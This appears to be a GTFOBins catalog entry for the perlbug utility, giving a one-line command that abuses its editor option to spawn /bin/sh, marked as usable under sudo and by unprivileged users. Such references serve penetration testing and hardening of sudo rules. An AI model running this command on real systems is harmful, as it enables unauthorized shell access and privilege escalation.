<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/perlbug -->
---
functions:
  shell:
  - code: |-
      perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
    comment: |-
      This requires to press `Enter` serveral times before the shell is spawn.
    contexts:
      sudo:
      unprivileged:
...
